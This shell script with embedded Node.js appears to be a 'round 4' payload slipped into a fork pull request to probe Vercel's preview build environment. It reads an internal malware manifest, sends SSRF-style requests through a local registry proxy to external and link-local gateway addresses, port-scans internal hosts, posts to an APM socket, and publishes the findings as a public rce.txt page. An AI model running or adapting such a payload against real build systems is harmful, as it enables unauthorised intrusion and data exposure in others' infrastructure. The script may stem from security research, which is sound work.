#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 4: the process list revealed a
# local registry proxy (port 8402) holding NPM_PROXY_UPSTREAM and
# VERCEL_NPM_PROXY_FORWARD_AUTH_HOST, and a malware manifest. Question: can
# untrusted build code drive that proxy, and is it a door into Vercel's network?
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== malware manifest shipped into the cell =="
  ls -la /vercel/malware-manifest-* 2>&1 | head -4
  node -e '
const fs=require("fs");
let dir="";
try{dir=fs.readdirSync("/vercel").filter(d=>d.startsWith("malware-manifest"))[0]||"";}catch(e){}
if(!dir){console.log("  (no manifest dir found)");process.exit(0);}
const j=JSON.parse(fs.readFileSync("/vercel/"+dir+"/manifest.json","utf8"));
console.log("  schemaVersion",j.schemaVersion,"| top-level keys:",Object.keys(j).join(", "));
for(const k of Object.keys(j)){
  const v=j[k];
  if(v&&Array.isArray(v.rules)){
    console.log("  "+k+": "+v.rules.length+" rules; sample: "+v.rules.slice(0,3).map(r=>(r.name||"")+"@"+(r.version||"")).join(", "));
    const hits=v.rules.filter(r=>/vercel|turbo|next/i.test((r.name||"")+(r.id||"")));
    console.log("    rules naming vercel/turbo/next packages: "+hits.length);
  }
}
'
  echo "== what the build container prewarm left behind =="
  ls -la /vercel/.build-container-prewarm 2>&1 | head -6
  ls -la /vercel/output /vercel/path0 2>&1 | head -10
} > "$F" 2>&1
{
  echo "== registry proxy (127.0.0.1:8402) =="
  node -e '
const http=require("http"),net=require("net"),crypto=require("crypto");
const show=(label,res,body)=>{
  const h=crypto.createHash("sha256").update(body).digest("hex").slice(0,8);
  console.log("  "+label+" -> "+res.statusCode+" | "+body.length+"b sha "+h+" | "+body.slice(0,110).replace(/\r?\n/g," "));
};
const get=(host,port,path,label,absolute)=>new Promise(res=>{
  const req=http.request({host,port,path,timeout:4000,method:absolute?"GET":"GET",path:absolute?path:path,headers:absolute?{}:{}},r=>{
    let b="";r.on("data",c=>b+=c);r.on("end",()=>res(show(label,r,b)));
  });
  req.on("error",e=>res("  "+label+" -> ERR "+e.code));
  req.end();
});
const raw=(host,port,label)=>new Promise(res=>{
  const c=net.createConnection({host,port,timeout:1500});
  let done=false;const fin=o=>{if(done)return;done=true;res({h:host,p:port,open:o});};
  c.on("connect",()=>{fin(true);c.destroy();});
  c.on("error",()=>fin(false));
  c.on("timeout",()=>{c.destroy();fin(false);});
});
(async()=>{
  const probes=[
    ["127.0.0.1",8402,"/turbo","proxy: GET /turbo"],
    ["127.0.0.1",8402,"/turbo/2.11.11","proxy: GET /turbo/2.11.11"],
    ["127.0.0.1",8402,"/turbo/2.11.11/package.json","proxy: GET pkg json"],
    ["127.0.0.1",8402,"/-/v1/search?text=axios&size=1","proxy: registry search"],
    ["127.0.0.1",8402,"/axios","proxy: GET /axios (blocked pkg)"],
    ["127.0.0.1",8402,"/http://example.com/","proxy: absolute-form http"],
    ["127.0.0.1",8402,"/http://169.254.0.1/","proxy: absolute-form to gateway"],
    ["127.0.0.1",8402,"/example.com/index.html","proxy: bare host path"],
  ];
  for(const [h,p,path,label] of probes) await get(h,p,path,label,false);
  console.log("== tcp scan round 4 ==");
  const targets=[[["127.0.0.1"],[8402,8403,8081,9000,6060,4317,4318,11111]],[["169.254.0.1"],[22,53,80,443,8080,9000,4317,4318,6060,8081]],[["169.254.0.2","169.254.1.1"],[80,443]]];
  let open=[],closed=0;
  for(const [hosts,ports] of targets)
    for(const h of hosts) for(const p of ports){const r=await raw(h,p);if(r.open)open.push(r.h+":"+r.p);else closed++;}
  console.log("  OPEN: "+(open.join(", ")||"none")+" | closed: "+closed);
})();
' >> "$F" 2>&1
  echo "== apm socket: telemetry-style paths =="
  node -e '
const net=require("net"),crypto=require("crypto");
const paths=["/v1/traces","/v1/metrics","/v1/logs","/trace/v1","/metrics/v1","/opentelemetry/v1/traces","/datadog","/statsd","/v1/telemetry","/api/v1/traces","/otlp/v1/traces"];
let i=0;
const next=()=>{
  if(i>=paths.length){return;}
  const p=paths[i++];
  const c=net.createConnection({path:"/run/apm/apm.sock",timeout:2500});
  let got="",done=false;
  const fin=()=>{if(done)return;done=true;
    const h=crypto.createHash("sha256").update(got).digest("hex").slice(0,8);
    console.log("  POST "+p+" -> "+got.split("\r\n")[0]+" | "+got.length+"b sha "+h+" | "+got.slice(0,80).replace(/\r?\n/g," "));
    next();};
  c.on("data",d=>got+=d);c.on("error",e=>{if(!done){done=true;console.log("  POST "+p+" -> ERR "+e.code);next();}});
  c.on("close",fin);
  c.on("connect",()=>c.write("POST "+p+" HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}"));
};
next();
' >> "$F" 2>&1
} >> "$F" 2>&1
sleep 3
cat "$F"
